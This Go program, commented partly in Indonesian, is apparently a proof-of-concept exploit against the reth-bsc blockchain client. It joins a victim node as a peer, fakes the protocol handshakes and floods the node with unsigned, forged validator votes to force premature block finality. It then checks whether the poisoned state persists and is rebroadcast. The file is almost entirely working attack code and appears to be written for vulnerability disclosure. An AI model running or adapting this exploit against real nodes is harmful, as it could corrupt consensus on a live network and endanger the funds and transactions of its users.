// PoC: Premature Finality via Unverified P2P Vote Injection (reth-bsc)
// Victim memanggil DIAL ke attacker (admin_addPeer) -> attacker = responder
// -> forkid-echo self-consistent by construction.
// Fase: OBSERVE -> CONTROL -> ATTACK -> PERSIST -> FORENSIC.
package main

import (
    "crypto/ecdsa"
    "crypto/rand"
    "encoding/hex"
    "encoding/json"
    "fmt"
    "math/big"
    "net/http"
    "os"
    "strconv"
    "strings"
    "sync"
    "time"

    "github.com/ethereum/go-ethereum/common"
    "github.com/ethereum/go-ethereum/crypto"
    "github.com/ethereum/go-ethereum/log"
    "github.com/ethereum/go-ethereum/p2p"
)

// ===== Wire types — field order = RLP field order (vote.rs; dikunci proto.rs reference vector) =====
type VoteData struct {
    SourceNumber uint64
    SourceHash   common.Hash
    TargetNumber uint64
    TargetHash   common.Hash
}
type VoteEnvelope struct {
    VoteAddress [48]byte // garbage — tidak pernah di-parse sebagai BLS point (RC-1)
    Signature   [96]byte // NOL — tidak pernah diverifikasi (RC-1)
    Data        VoteData
}
type votesPacket struct{ Votes []*VoteEnvelope } // RLP [[env...]] — wrapper 2 level
type capPacket struct {                          // RLP [version, extra] — paritas go-bsc
    ProtocolVersion uint64
    Extra           []byte
}
type forkID struct { // paritas RLP forkid.ID (EIP-2124): [Hash 32B, Next uint64]
    Hash [4]byte
    Next uint64
}
type ethStatus struct { // eth/68 status
    ProtocolVersion uint32
    NetworkID       uint64
    TD              *big.Int
    Head            common.Hash
    Genesis         common.Hash
    ForkID          forkID
}

func env(k, d string) string {
    if v := os.Getenv(k); v != "" {
        return v
    }
    return d
}
func envInt(k string, d int) int {
    if v := os.Getenv(k); v != "" {
        if n, err := strconv.Atoi(v); err == nil {
            return n
        }
    }
    return d
}

type blk struct {
    Number string `json:"number"`
    Hash   string `json:"hash"`
}

func (b *blk) num() int64 {
    if b == nil || b.Number == "" {
        return -1
    }
    n := new(big.Int)
    n.SetString(strings.TrimPrefix(b.Number, "0x"), 16)
    return n.Int64()
}

func rpcBlock(url, tag string) *blk {
    body, _ := json.Marshal(map[string]any{
        "jsonrpc": "2.0", "id": 1, "method": "eth_getBlockByNumber", "params": []any{tag, false},
    })
    resp, err := http.Post(url, "application/json", strings.NewReader(string(body)))
    if err != nil {
        return nil
    }
    defer resp.Body.Close()
    var out struct {
        Result *blk `json:"result"`
    }
    if json.NewDecoder(resp.Body).Decode(&out) != nil {
        return nil
    }
    return out.Result
}

func rpcCall(url, method string, params []any) (json.RawMessage, error) {
    body, _ := json.Marshal(map[string]any{"jsonrpc": "2.0", "id": 1, "method": method, "params": params})
    resp, err := http.Post(url, "application/json", strings.NewReader(string(body)))
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    var out struct {
        Result json.RawMessage `json:"result"`
    }
    if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
        return nil, err
    }
    return out.Result, nil
}

// ================= injector =================
type injector struct {
    mu            sync.Mutex
    rw            p2p.MsgReadWriter
    cancel        chan struct{}
    forgedAttack  map[[48]byte]bool
    forgedControl map[[48]byte]bool
    lastSyncSeen  int
    lastSyncHit   int
    armed         bool
    rpc, enode    string
}

func (inj *injector) isArmed() bool {
    inj.mu.Lock()
    defer inj.mu.Unlock()
    return inj.armed
}

// eth/68 responder — mirror status victim (forkid self-consistent by construction)
func (inj *injector) runEth(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
    msg, err := rw.ReadMsg()
    if err != nil {
        return err
    }
    if msg.Code != 0x00 {
        msg.Discard()
        return fmt.Errorf("expected eth status, got %d", msg.Code)
    }
    var theirs ethStatus
    if err := msg.Decode(&theirs); err != nil {
        return err
    }
    ours := theirs
    ours.ProtocolVersion = 68
    if err := p2p.Send(rw, 0x00, &ours); err != nil {
        return err
    }
    log.Info("eth/68 status MIRRORED", "network", theirs.NetworkID)
    for { // drain announcements
        msg, err := rw.ReadMsg()
        if err != nil {
            return err
        }
        msg.Discard()
    }
}

// bsc/2: baca capability victim -> kirim capability -> baca sync-dump -> ARMED
func (inj *injector) run(peer *p2p.Peer, rw p2p.MsgReadWriter) error {
    cancel := make(chan struct{})
    inj.mu.Lock()
    inj.cancel = cancel
    inj.mu.Unlock()
    crw := &cancelRW{rw: rw, cancel: cancel}

    msg, err := crw.ReadMsg()
    if err != nil {
        return err
    }
    if msg.Code != 0x00 {
        msg.Discard()
        return fmt.Errorf("expected bsc capability, got %d", msg.Code)
    }
    msg.Discard()
    // stream.rs: version EXACT 2; extra raw [0x00]
    if err := p2p.Send(crw, 0x00, &capPacket{ProtocolVersion: 2, Extra: []byte{0x00}}); err != nil {
        return err
    }
    log.Warn("bsc/2 handshake ESTABLISHED — NOL autentikasi", "peer", peer.ID().TerminalString())

    // register_peer() -> sync_pending_votes_to_peer(): dump pool dikirim ke session baru
    if msg, err := crw.ReadMsg(); err == nil {
        if msg.Code == 0x01 {
            var pkt votesPacket
            if derr := msg.Decode(&pkt); derr == nil {
                inj.mu.Lock()
                inj.lastSyncSeen = len(pkt.Votes)
                hit := 0
                for _, v := range pkt.Votes {
                    if inj.forgedAttack[v.VoteAddress] || inj.forgedControl[v.VoteAddress] {
                        hit++
                    }
                }
                inj.lastSyncHit = hit
                inj.mu.Unlock()
                log.Info("sync-dump diterima dari victim", "votes", len(pkt.Votes), "attacker_hits", hit)
            }
        } else {
            msg.Discard()
        }
    }

    inj.mu.Lock()
    inj.rw = rw
    inj.armed = true
    inj.mu.Unlock()

    for {
        msg, err := crw.ReadMsg()
        if err != nil {
            inj.mu.Lock()
            inj.rw, inj.armed = nil, false
            inj.mu.Unlock()
            return err
        }
        msg.Discard() // broadcast vote victim — drain
    }
}

type cancelRW struct {
    rw     p2p.MsgReadWriter
    cancel <-chan struct{}
}

func (c *cancelRW) ReadMsg() (p2p.Msg, error) {
    type res struct {
        m p2p.Msg
        e error
    }
    ch := make(chan res, 1)
    go func() { m, e := c.rw.ReadMsg(); ch <- res{m, e} }()
    select {
    case r := <-ch:
        return r.m, r.e
    case <-c.cancel:
        return p2p.Msg{}, fmt.Errorf("cancelled for forensic reconnect")
    }
}
func (c *cancelRW) WriteMsg(m p2p.Msg) error { return c.rw.WriteMsg(m) }

// SATU envelope per packet — handle_votes_broadcast() hanya meng-ingest elemen pertama.
func (inj *injector) send(v *VoteEnvelope) error {
    inj.mu.Lock()
    rw := inj.rw
    inj.mu.Unlock()
    if rw == nil {
        return fmt.Errorf("no bsc session")
    }
    return p2p.Send(rw, 0x01, &votesPacket{Votes: []*VoteEnvelope{v}})
}

func ensureArmed(rpc, enode string, inj *injector, timeout time.Duration) bool {
    deadline := time.Now().Add(timeout)
    for time.Now().Before(deadline) {
        if inj.isArmed() {
            return true
        }
        if r, err := rpcCall(rpc, "admin_addPeer", []any{enode}); err != nil {
            log.Warn("admin_addPeer ERROR", "err", err)
        } else {
            log.Info("admin_addPeer", "result", string(r))
        }
        time.Sleep(700 * time.Millisecond)
    }
    return inj.isArmed()
}

type headObs struct{ headNum, finNum int64 }

func watchHeads(rpc string, count int, inject bool, quorum int, wrongTarget bool, inj *injector, tag string) (obs []headObs, forged, late int) {
    var lastHash string
    for len(obs) < count {
        head := rpcBlock(rpc, "latest")
        if head == nil || head.Hash == lastHash || head.num() < 2 {
            time.Sleep(200 * time.Millisecond)
            continue
        }
        lastHash = head.Hash
        n := head.num()
        before := int64(-1)
        if b := rpcBlock(rpc, "finalized"); b != nil {
            before = b.num()
        }

        if inject {
            if !inj.isArmed() { // watchdog re-arm
                _, _ = rpcCall(inj.rpc, "admin_addPeer", []any{inj.enode})
                time.Sleep(1200 * time.Millisecond)
            }
            target := common.HexToHash(head.Hash) // dibaca LIVE dari state victim
            var book map[[48]byte]bool
            if wrongTarget { // kontrol negatif: bucket yang tak pernah dibaca
                book = inj.forgedControl
                var junk [32]byte
                for i := range junk {
                    junk[i] = byte(int(n)*7 + i)
                }
                target = common.Hash(junk)
            } else {
                book = inj.forgedAttack
            }
            for i := 0; i < quorum; i++ {
                var addr [48]byte
                rand.Read(addr[:]) // BLS pubkey garbage
                book[addr] = true
                if err := inj.send(&VoteEnvelope{
                    VoteAddress: addr,
                    Signature:   [96]byte{}, // NOL
                    Data: VoteData{
                        SourceNumber: uint64(n - 1), // steady state: justified == head-1
                        SourceHash:   common.Hash{}, // filter TIDAK memeriksa source_hash (RC-2)
                        TargetNumber: uint64(n),
                        TargetHash:   target,
                    },
                }); err != nil {
                    log.Warn("inject failed", "phase", tag, "err", err)
                    break
                }
            }
        }

        // Window: sampai head baru ATAU finality melompat ATAU timeout.
        // Premature = finalized mencapai n-1 SELAGU head masih n
        // (organik BEP-126: finalized = head-2; n-1 baru organik setelah blok n+1 mendarat).
        after := before
        forgedThis, lateThis := false, false
        deadline := time.Now().Add(8 * time.Second)
        for time.Now().Before(deadline) {
            time.Sleep(120 * time.Millisecond)
            cur := rpcBlock(rpc, "latest")
            f := int64(-1)
            if b := rpcBlock(rpc, "finalized"); b != nil {
                f = b.num()
            }
            if inject && f == n-1 && before < n-1 {
                if cur != nil && cur.Hash == head.Hash {
                    forgedThis = true // PREMATURE — sebelum blok berikutnya
                } else {
                    lateThis = true // tercapai tapi setelah head bergerak = organik
                }
                after = f
                break
            }
            after = f
            if cur != nil && cur.Hash != head.Hash {
                break
            }
        }
        if forgedThis {
            forged++
        }
        if lateThis {
            late++
        }
        obs = append(obs, headObs{n, before})
        log.Info("window", "phase", tag, "head", n, "fin_before", before, "fin_after", after,
            "premature_forged", forgedThis, "late_or_organic", lateThis)
    }
    return
}

func main() {
    rpc := env("VICTIM_RPC", "http://127.0.0.1:8545")
    quorum := envInt("QUORUM", 21)
    advertise := env("ADVERTISE_IP", "127.0.0.1")
    port := envInt("LISTEN_PORT", 30304)
    observeHeads := envInt("OBSERVE_HEADS", 6)
    controlHeads := envInt("CONTROL_HEADS", 3)
    attackHeads := envInt("ATTACK_HEADS", 6)
    persistHeads := envInt("PERSIST_HEADS", 8)

    var key *ecdsa.PrivateKey
    if hk := os.Getenv("ATTACKER_KEY"); hk != "" {
        b, _ := hex.DecodeString(hk)
        key, _ = crypto.ToECDSA(b)
    } else {
        key, _ = crypto.GenerateKey()
    }
    pub := crypto.FromECDSAPub(&key.PublicKey)[1:]
    enode := fmt.Sprintf("enode://%s@%s:%d", hex.EncodeToString(pub), advertise, port)
    fmt.Println("ATTACKER STARTED")
    log.Root().SetHandler(log.StreamHandler(os.Stderr, log.TerminalFormat(false)))
    fmt.Println("ENODE:", enode)

    inj := &injector{
        forgedAttack:  map[[48]byte]bool{},
        forgedControl: map[[48]byte]bool{},
        rpc:           rpc,
        enode:         enode,
    }
    srv := &p2p.Server{Config: p2p.Config{
        PrivateKey: key, MaxPeers: 16, NoDiscovery: true,
        ListenAddr: fmt.Sprintf(":%d", port),
        Protocols: []p2p.Protocol{
            {Name: "eth", Version: 68, Length: 17, Run: inj.runEth},
            {Name: "bsc", Version: 2, Length: 4, Run: inj.run},
        },
    }}
    if err := srv.Start(); err != nil {
        panic(err)
    }
    defer srv.Stop()

    if !ensureArmed(rpc, enode, inj, 120*time.Second) {
        fmt.Println("FAILED: bsc/2 session tidak terbentuk — cek VICTIM_RPC / ADVERTISE_IP / port"); os.Exit(1)
    }
    fmt.Println("ARMED:", quorum)

    log.Warn("=== FASE 1: OBSERVE (normal flow — LOGIC_GATE_4) ===")
    obs, _, _ := watchHeads(rpc, observeHeads, false, 0, false, inj, "observe")
    moved := false
    for i := 1; i < len(obs); i++ {
        if obs[i].finNum > obs[i-1].finNum {
            moved = true
        }
    }
    if moved {
        log.Warn("CHECKPOINT-1 OK — finality organik bergerak; window steady-state TERBUKA")
    } else {
        log.Warn("CHECKPOINT-1 GAGAL — finality organik tidak bergerak (validator tidak vote?). Keterbatasan setup, BUKAN refute temuan (bukti engine: unit test in-tree + source).")
    }

    log.Warn("=== FASE 2: CONTROL (target_hash acak — harus no-op) ===")
    _, ctlForged, _ := watchHeads(rpc, controlHeads, true, quorum, true, inj, "control")
    if ctlForged == 0 {
        log.Warn("NEGATIVE CONTROL OK — vote target salah tidak mengubah finality")
    } else {
        log.Error("ANOMALI CONTROL — finality berubah tanpa target_hash valid")
    }

    log.Warn("=== FASE 3: ATTACK (quorum envelope garbage per head, 0 signature valid) ===")
    ensureArmed(rpc, enode, inj, 10*time.Second)
    _, atkForged, atkLate := watchHeads(rpc, attackHeads, true, quorum, false, inj, "attack")
    if atkForged > 0 {
        log.Error(">>> PREMATURE FINALITY FORGED <<<",
            "windows_forged", atkForged, "of", attackHeads,
            "votes_per_head", quorum, "valid_bls_signatures", 0)
    } else {
        log.Warn("TIDAK ada forge prematur teramati", "late_only", atkLate,
            "note", "window tertutup / CHECKPOINT-1 gagal")
    }

    log.Warn("=== FASE 4: PERSIST (injeksi DIHENTIKAN — poison dibaca ulang import-path?) ===")
    per, _, _ := watchHeads(rpc, persistHeads, false, 0, false, inj, "persist")
    vals := []int64{}
    for _, o := range per {
        vals = append(vals, o.finNum)
    }
    flap := false
    for i := 1; i < len(vals); i++ {
        if vals[i] < vals[i-1] {
            flap = true
        }
    }
    log.Warn("PERSIST RESULT", "finalized_sequence", vals, "flapping", flap,
        "note", "flapping = finality view inkonsisten antar-FCU (poison vs snapshot)")

    log.Warn("=== FASE 5: FORENSIC (drop session -> re-add -> baca sync-dump victim) ===")
    inj.mu.Lock()
    if inj.cancel != nil {
        close(inj.cancel)
    }
    inj.mu.Unlock()
    time.Sleep(2 * time.Second)
    found := false
    for i := 0; i < 40 && !found; i++ {
        if r, err := rpcCall(rpc, "admin_addPeer", []any{enode}); err != nil {
            log.Warn("admin_addPeer ERROR", "err", err)
        } else {
            log.Info("admin_addPeer", "result", string(r))
        }
        time.Sleep(700 * time.Millisecond)
        inj.mu.Lock()
        seen, hit, armed := inj.lastSyncSeen, inj.lastSyncHit, inj.armed
        inj.mu.Unlock()
        if armed && seen > 0 {
            log.Error(">>> VICTIM RETRANSMISI ENVELOPE TAK-TERVERIFIKASI (BUKTI WIRE) <<<",
                "votes_disinkronkan", seen, "attacker_envelope_hits", hit,
                "note", "sync_pending_votes_to_peer menyiarkan ulang isi pool (termasuk vote sampah) ke peer baru")
            found = true
        }
    }
    if !found {
        log.Warn("forensic: sync-dump tidak diterima (pool kosong / reconnect gagal)")
    }

    if atkForged > 0 {
        os.Exit(0)
    }
    os.Exit(3)
}
